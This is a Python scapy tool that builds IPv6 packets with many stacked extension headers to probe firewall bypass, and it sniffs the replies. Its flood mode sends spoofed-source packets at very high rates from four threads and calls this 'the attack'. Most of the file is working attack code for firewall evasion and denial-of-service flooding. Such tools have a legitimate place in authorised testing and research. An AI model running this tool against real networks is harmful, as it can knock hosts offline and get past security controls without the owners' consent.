#!/usr/bin/python
import argparse
import logging
import multiprocessing
import random
import sys
import threading
from collections import Counter

import netifaces
import netifaces as ni
import psutil
from scapy.arch import get_if_hwaddr
from scapy.layers.inet import TCP, UDP
from scapy.layers.inet6 import IPv6, IPv6ExtHdrDestOpt, Pad1, PadN, IPv6ExtHdrFragment, fragment6, IPv6ExtHdrHopByHop, \
    RouterAlert, IPv6ExtHdrRouting, ICMPv6EchoRequest, ICMPv6EchoReply, ICMPv6ParamProblem, ICMPv6DestUnreach, \
    ICMPv6TimeExceeded, ICMPv6PacketTooBig, ICMPv6ND_NA
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp, sendpfast, sniff
from scapy.volatile import RandShort, RandString, RandInt
from validate_parameters import is_valid_ipv6, payload, convert_paramProblem, convert_destUnrechable, \
    convert_timeExceeded, convert_tcpFlags
from validate_parameters import is_valid_mac
from validate_parameters import is_valid_port

# Increase the recursion limit when calling Python objects (used when lots of Extension headers - > 300 headers)
sys.setrecursionlimit(10 ** 6)


def parameter():
    parser = argparse.ArgumentParser(
        description="Sending TCP SYN, UDP or ICMPv6 message(s) with Destination Header to a "
                    "target for checking firewall bypass with several related options "
                    "such as 1x Destination Option, 3x Destination Option, "
                    "and Destination Option Header + Other Headers. Option to flood is also included.")
    parser.add_argument("interface", nargs="?", help="the network interface to use from the sender")
    parser.add_argument("-type", dest="type", choices=["TCP", "UDP", "ICMPv6"], action="store", default="ICMPv6",
                        help="the type of packet to send (TCP, UDP, ICMPv6) (ICMPv6 if skipping)")
    parser.add_argument("-smac", dest="source_mac", action="store",
                        help="the MAC address of sender (resolved from the interface if skipping)")
    parser.add_argument("-sip", dest="source_ip", action="store", help="the IPv6 address of sender (resolved from the"
                                                                       " interface if skipping)")
    parser.add_argument("-dip", dest="destination_ip", action="store", help="the IPv6 address of destination (ff02::1"
                                                                            " if skipping)")
    parser.add_argument("-sport", dest="source_port", action="store", type=int,
                        help="the port of sender (set to random port if skipping when TCP or UDP)")
    parser.add_argument("-dport", dest="dest_port", action="store", type=int,
                        help="the port of destination (set to random port if skipping when TCP or UDP)")
    parser.add_argument("-dest", dest="dest_hdr", action="store", type=int, default=1,
                        help="the number of Destination Options Headers in packet (set to 1 if skipping)")
    parser.add_argument("-hbh", dest="hbh_hdr", action="store", type=int,
                        help="the number of empty Hop-by-Hop Options Headers in packet")
    parser.add_argument("-rout", dest="rout_hdr", action="store", type=int,
                        help="the number of empty Routing Headers in packet")
    parser.add_argument("-frag", dest="frag_hdr", action="store", type=int,
                        help="the number of empty Fragmentation Headers in packet")
    parser.add_argument("-data", dest="data", action="store_true",
                        help="add the hidden random data in each Destination Options header")
    parser.add_argument("-f", dest="flood", action="store", choices=['constant', 'random'],
                        help="flood the targets with option: sending messages using only the defined "
                             "source addresses (constant), or sending messages with many random source "
                             "addresses (random)")
    args = parser.parse_args()

    # Validate the input
    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(1)

    # Validate the network interface
    if not args.interface:
        print("---> Network interface is required!!!")
        parser.print_help()
        sys.exit(1)
    interface_list = netifaces.interfaces()
    while True:
        if args.interface in interface_list:
            break
        else:
            print("---> The given interface is invalid. Try again!!!")
            sys.exit(1)

    # Validate the type of packet
    if args.type is None:
        args.type = "ICMPv6"

    # Validate the source IPv6 address
    if args.source_ip is None:
        args.source_ip = ni.ifaddresses(args.interface)[ni.AF_INET6][0]['addr']
        args.source_ip = args.source_ip.replace("%", '')
        args.source_ip = args.source_ip.replace(args.interface, '')
    if args.source_ip is not None:
        if not is_valid_ipv6(args.source_ip):
            print("---> The given source IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the destination IPv6 address
    if args.destination_ip is None:
        print("---> No destination IPv6 address is inserted. Try again!!!")
        sys.exit(1)
    if args.destination_ip is not None:
        if not is_valid_ipv6(args.destination_ip):
            print("---> The given destination IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the source MAC address
    if args.source_mac is None:
        args.source_mac = get_if_hwaddr(args.interface)
    if args.source_mac is not None:
        if not is_valid_mac(args.source_mac):
            print("---> The given source MAC address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the source port
    if args.source_port is None:
        args.source_port = RandShort()
    if args.source_port is not None:
        if not is_valid_port(args.source_port):
            print("---> The given source port is invalid. Try again!!!")
            sys.exit(1)

    # Validate the destination port
    if args.dest_port is None:
        args.dest_port = RandShort()
    if args.dest_port is not None:
        if not is_valid_port(args.dest_port):
            print("---> The given destination port is invalid. Try again!!!")
            sys.exit(1)

    # Validate the number of Extension headers
    if args.dest_hdr is not None:
        if args.dest_hdr <= 0 or args.dest_hdr > 300:
            print("---> The given number of Hop-by-Hop option headers is invalid. Try again!!!")
            sys.exit(1)
    if args.hbh_hdr is not None:
        if args.hbh_hdr <= 0 or args.hbh_hdr > 300:
            print("---> The given number of Hop-by-Hop option headers is invalid. Try again!!!")
            sys.exit(1)
    if args.rout_hdr is not None:
        if args.rout_hdr <= 0 or args.rout_hdr > 300:
            print("---> The given number of Routing headers is invalid. Try again!!!")
            sys.exit(1)
    if args.frag_hdr is not None:
        if args.frag_hdr <= 0 or args.frag_hdr > 300:
            print("---> The given number of Fragmentation headers is invalid. Try again!!!")
            sys.exit(1)

    # Turning off logging
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

    return args.interface, args.type, args.source_mac, args.source_ip, args.destination_ip, args.source_port, args.dest_port, args.dest_hdr, args.hbh_hdr, args.rout_hdr, args.frag_hdr, args.data, args.flood


def generate(interface, type, source_mac, source_ip, destination_ip, source_port, dest_port, num_dest_hdr, num_hbh_hdr,
             num_rout_hdr, num_frag_hdr, data, flood):
    # Validate the option of packet a general format of packet
    layer2 = Ether(src=source_mac)
    layer3 = IPv6(src=source_ip, dst=destination_ip, hlim=255)

    if type == "TCP":
        layer4 = TCP(sport=source_port, dport=dest_port, seq=RandInt(), flags='S')
    if type == "UDP":
        layer4 = UDP(sport=source_port, dport=dest_port)

    # Generate packet
    if data:
        dest_hdr = IPv6ExtHdrDestOpt(
            options=[PadN(optdata=RandString(size=10))] + [PadN(optdata=RandString(size=10))] + [
                PadN(optdata=RandString(size=10))] + [PadN(optdata=RandString(size=10))] + [
                        PadN(optdata=RandString(size=10))])
        for i in range(num_dest_hdr - 1):
            dest_hdr /= IPv6ExtHdrDestOpt(
                options=[PadN(optdata=RandString(size=10))] + [PadN(optdata=RandString(size=10))] + [
                    PadN(optdata=RandString(size=10))] + [PadN(optdata=RandString(size=10))] + [
                            PadN(optdata=RandString(size=10))])
    if not data:
        dest_hdr = IPv6ExtHdrDestOpt(options=[Pad1()] + [Pad1()] + [Pad1()] + [Pad1()] + [Pad1()])
        for i in range(num_dest_hdr - 1):
            dest_hdr /= IPv6ExtHdrDestOpt(options=[Pad1()] + [Pad1()] + [Pad1()] + [Pad1()] + [Pad1()])

    # Hop-by-Hop
    if num_hbh_hdr is not None:
        hbh_hdr = IPv6ExtHdrHopByHop(options=RouterAlert(otype=5, optlen=2, value=0))
        for i in range(num_hbh_hdr - 1):
            hbh_hdr /= IPv6ExtHdrHopByHop(options=RouterAlert(otype=5, optlen=2, value=0))

    # Routing header
    if num_rout_hdr is not None:
        rout_hdr = IPv6ExtHdrRouting()
        for i in range(num_rout_hdr - 1):
            rout_hdr /= IPv6ExtHdrRouting()

    # Fragment header
    if num_frag_hdr is not None:
        frag_hdr = IPv6ExtHdrFragment(id=0, m=0)
        for i in range(num_frag_hdr - 1):
            if i == num_frag_hdr - 1:
                frag_hdr /= IPv6ExtHdrFragment(id=frag_hdr+1, m=0)
                break
            frag_hdr /= IPv6ExtHdrFragment(id=i + 1, m=0)

    # Packet design
    packet1 = layer2 / layer3 / dest_hdr
    if num_hbh_hdr is not None:
        packet1 /= hbh_hdr
    if num_rout_hdr is not None:
        packet1 /= rout_hdr
    if num_frag_hdr is not None:
        packet1 /= frag_hdr
    if type == "ICMPv6":
        packet1 /= ICMPv6EchoRequest(id=RandShort(), seq=1, data=payload(32))
    if type == "TCP" or type == "UDP":
        packet1 /= layer4

    stats = psutil.net_if_stats()
    mtu = stats.get(interface).mtu
    if flood is None:
        print("Sending packet with Destination Option header to destination: " + destination_ip)
        if len(packet1) > mtu + 10:
            sendp(fragment6(packet1, mtu), verbose=False, iface=interface)
        else:
            sendp(packet1, verbose=False, iface=interface)
    if flood is not None:
        pkt_list = []
        print("Flooding the destination: " + destination_ip + "with Destination Option headers messages (press "
                                                              "Ctrl+C to stop the attack).....")
        if flood == "constant":
            if len(packet1) > mtu + 10:
                packet1 = fragment6(packet1, mtu)
            for i in range(50):
                pkt_list.append(packet1)

        if flood == "random":
            for i in range(40):
                random_mac = "02:01:00:%02x:%02x:%02x" % (random.randint(0, 255),
                                                          random.randint(0, 255),
                                                          random.randint(0, 255))
                M = 16 ** 4
                source_ip = "2001:dead:" + ":".join(("%x" % random.randint(0, M) for j in range(6)))
                layer2 = Ether(src=random_mac)
                layer3 = IPv6(src=source_ip, dst=destination_ip, hlim=255)
                packet1 = layer2 / layer3 / dest_hdr
                if num_hbh_hdr is not None:
                    packet1 /= hbh_hdr
                if num_rout_hdr is not None:
                    packet1 /= rout_hdr
                if num_frag_hdr is not None:
                    packet1 /= frag_hdr
                if type == "ICMPv6":
                    packet1 /= ICMPv6EchoRequest(id=RandShort(), seq=i, data=payload(32))
                if type == "TCP" or type == "UDP":
                    packet1 /= layer4
                if len(packet1) > mtu + 10:
                    packet1 = fragment6(packet1, mtu)
                pkt_list.append(packet1)

        def send_packets(packet, iface):
            try:
                sendpfast(packet, mbps=60000, pps=30000, loop=5000000, iface=iface)
            except KeyboardInterrupt:
                pass

        threads = []
        for i in range(4):
            thread = threading.Thread(target=send_packets, args=(pkt_list, interface))
            threads.append(thread)
            thread.start()

        # wait for all threads to complete
        for thread in threads:
            thread.join()


def sniffing(interface, source_ip, destination_ip):
    # Define our Custom Action function
    ip_list = []
    packet_counts = Counter()

    def custom_action(packet):
        # Create tuple of Src/Dst in sorted order
        if packet[0][1].src not in ip_list and ICMPv6ND_NA not in packet:
            key = tuple(sorted([source_ip, destination_ip]))
            packet_counts.update([key])
            if ICMPv6EchoReply in packet:
                print("===> Received Echo Reply of packet #" + str(sum(packet_counts.values())) + " from: " + packet[0][1].src + " with MAC: " + packet[0].src)
                ip_list.append(packet[0][1].src)
            if ICMPv6ParamProblem in packet:
                print("===> Received Parameter Problem of packet #" + str(sum(packet_counts.values())) + " from: " + packet[0][1].src + " with MAC: " + packet[0].src)
                print("     with error: " + convert_paramProblem(packet[ICMPv6ParamProblem].code))
                ip_list.append(packet[0][1].src)
            if ICMPv6DestUnreach in packet:
                print("===> Received Destination Unreachable of packet #" + str(sum(packet_counts.values())) + " from: " + packet[0][1].src + " with MAC: " + packet[0].src)
                print("     with error: " + convert_destUnrechable(packet[ICMPv6DestUnreach].code))
                ip_list.append(packet[0][1].src)
            if ICMPv6TimeExceeded in packet:
                print("===> Received Time Exceeded of packet #" + str(sum(packet_counts.values())) + " from: " + packet[0][1].src + " with MAC: " + packet[0].src)
                print("     with error: " + convert_timeExceeded(packet[ICMPv6TimeExceeded].code))
                ip_list.append(packet[0][1].src)
            if ICMPv6PacketTooBig in packet:
                print("===> Received Packet Too Big of packet #" + str(sum(packet_counts.values())) + " from: " + packet[0][1].src + " with MAC: " + packet[0].src)
                print("     with informed MTU: " + str(packet[ICMPv6PacketTooBig].mtu))
                ip_list.append(packet[0][1].src)
            if TCP in packet:
                print("===> Received TCP message of packet #" + str(sum(packet_counts.values())) + " from: " + packet[0][1].src + " with MAC: " + packet[0].src)
                flag_list = list(str(packet[TCP].flags))
                flag_message = "     with informed flag: " + "--".join(("%s" % convert_tcpFlags(flag_list[j]) for j in range(len(flag_list))))
                print(flag_message)
                ip_list.append(packet[0][1].src)
            else:
                pass

    # Setup sniff, filtering for IP traffic to see the result
    build_filter = "ip6 dst %s" % source_ip

    try:
        sniff(iface=interface, filter=build_filter, prn=custom_action, timeout=2)
        if len(ip_list) < 1:
            print("===> No response found.")
    except KeyboardInterrupt:
        sys.exit(0)


def execute_functions(interface, type, source_mac, source_ip, destination_ip, source_port, dest_port, dest_hdr, hbh_hdr, rout_hdr, frag_hdr, data, flood):
    p1 = multiprocessing.Process(target=generate, args=[interface, type, source_mac, source_ip, destination_ip, source_port, dest_port, dest_hdr, hbh_hdr, rout_hdr, frag_hdr, data, flood])
    p2 = multiprocessing.Process(target=sniffing, args=[interface, source_ip, destination_ip])
    p2.start()
    p1.start()
    p2.join()
    p1.join()


if __name__ == "__main__":
    interface, type, source_mac, source_ip, destination_ip, source_port, dest_port, dest_hdr, hbh_hdr, rout_hdr, frag_hdr, data, flood = parameter()

    if flood is None:
        try:
            execute_functions(interface, type, source_mac, source_ip, destination_ip, source_port, dest_port, dest_hdr, hbh_hdr, rout_hdr, frag_hdr, data, flood)
        except KeyboardInterrupt:
            sys.exit(0)
    else:
        try:
            generate(interface, type, source_mac, source_ip, destination_ip, source_port, dest_port, dest_hdr, hbh_hdr, rout_hdr, frag_hdr, data, flood)
        except KeyboardInterrupt:
            # If KeyboardInterrupt is raised in the main thread, stop all child threads
            threading.Event().set()
            sys.exit(0)
